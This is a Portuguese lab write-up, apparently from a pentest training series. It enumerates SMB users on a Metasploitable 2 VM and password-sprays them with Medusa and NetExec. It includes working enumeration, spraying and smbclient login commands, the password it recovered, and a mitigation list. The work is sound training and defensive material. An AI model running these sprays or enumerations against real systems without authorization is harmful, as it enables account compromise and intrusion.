# 04 — Enumeração SMB e Password Spraying com Medusa

## 1. Objetivo

Este documento descreve a enumeração de usuários via SMB e a execução de password spraying contra a máquina Metasploitable 2, explicando a diferença entre essa técnica e o brute force tradicional.

> Todos os testes foram realizados em ambiente local, controlado e autorizado.

---

## 2. Escopo do Teste

| Item | Descrição |
|---|---|
| Serviço | SMB |
| Portas | 139/TCP e 445/TCP |
| Máquina atacante | Kali Linux |
| Máquina alvo | Metasploitable 2 |
| Ferramentas | enum4linux-ng, Medusa, smbclient |
| Tipo de ataque | Password spraying |
| Rede | Host-Only / ambiente controlado |

---

## 3. Brute Force vs. Password Spraying

| Característica | Brute Force | Password Spraying |
|---|---|---|
| Alvo | Um usuário, muitas senhas | Muitos usuários, uma senha |
| Velocidade | Alta | Baixa/controlada |
| Risco de lockout | Alto | Baixo |
| Detecção | Fácil | Difícil |
| Uso em corporativo | Inviável (lockout) | Prevalente |

Password spraying é amplamente utilizado em ataques reais contra ambientes Active Directory, onde políticas de bloqueio de conta tornam o brute force inviável.

---

## 4. Verificação das Portas SMB

```bash
nmap -sV -p 139,445 192.168.56.101
```

Resultado esperado:

```
139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn  Samba smbd 3.0.20-Debian
```

---

## 5. Enumeração de Usuários

### Ferramenta moderna (recomendada): enum4linux-ng

```bash
enum4linux-ng -A 192.168.56.101
```

O `enum4linux-ng` é a reescrita em Python do enum4linux original. Oferece output mais limpo, suporte a JSON/YAML e funciona melhor com versões modernas do Samba.

### Ferramenta legada: enum4linux

```bash
enum4linux -a 192.168.56.101
```

### Usuários obtidos via enumeração anônima:

```
msfadmin, user, postgres, service, backup, sys, games
```

A enumeração anônima foi possível porque o Metasploitable 2 permite conexões SMB sem autenticação — falha de configuração grave.

---

## 6. Password Spraying com Medusa

```bash
medusa -h 192.168.56.101 -U wordlists/smb-users.txt -p "123456" -M smbnt -O logs/smb-results.txt
```

### Parâmetros explicados:

| Parâmetro | Função |
|---|---|
| `-U` | Arquivo com lista de usuários |
| `-p "123456"` | Senha única testada contra todos |
| `-M smbnt` | Módulo SMB do Medusa (NTLMv1) |
| `-O` | Salva resultado em arquivo de log |

### Nota técnica sobre o módulo smbnt:

O módulo `-M smbnt` utiliza autenticação NTLMv1 via SMBv1. Em ambientes modernos (Windows 10+, Server 2019+), o SMBv1 está desabilitado por padrão. Para testes em ambientes modernos, ferramentas como **CrackMapExec** ou **NetExec** são mais adequadas:

```bash
# Exemplo com NetExec (alternativa moderna)
netexec smb 192.168.56.101 -u wordlists/smb-users.txt -p "123456"
```

---

## 7. Resultado

Credencial válida identificada:

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: 123456 [SUCCESS]
```

---

## 8. Validação do Acesso

```bash
smbclient -L //192.168.56.101 -U msfadmin
```

```bash
smbclient //192.168.56.101/tmp -U msfadmin
```

---

## 9. Vulnerabilidades Identificadas

- Enumeração anônima de usuários habilitada
- Senhas fracas e previsíveis
- SMBv1 ativo (protocolo legado e vulnerável)
- Nenhuma política de lockout configurada

---

## 10. Mitigação

- Desabilitar SMBv1: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
- Bloquear enumeração anônima: configurar `restrict anonymous = 2` no smb.conf
- Restringir portas 139 e 445 via firewall
- Implementar política de lockout de conta
- Aplicar princípio do menor privilégio nos compartilhamentos
- Monitorar autenticações SMB com alertas de spraying
